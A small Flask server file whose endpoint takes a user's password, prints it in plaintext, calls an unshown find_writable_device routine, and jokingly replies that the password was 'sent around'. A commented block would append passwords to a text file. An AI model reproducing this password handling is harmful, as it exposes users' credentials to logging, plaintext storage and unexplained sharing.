import asyncio

from flask import Flask, request, render_template, jsonify

from main import find_writable_device

# from flask_cors import CORS

app = Flask(__name__)
# CORS(app)  # Enable CORS to allow frontend requests

@app.route('/')
def index():
    return render_template('index.html')  # Serves the frontend UI

@app.route('/save_password', methods=['POST'])
def save_password():
    data = request.get_json()
    password = data.get('password')

    if password:
        asyncio.run(find_writable_device())
        print(password)
        # with open("passwords.txt", "a") as file:
        #     file.write(password + "\n")
        return jsonify({"message": "🔥Password not saved but sent around;)))))🔥"}), 200
    else:
        return jsonify({"message": "No password provided😔"}), 400

if __name__ == '__main__':
    app.run(debug=True, port=8000)
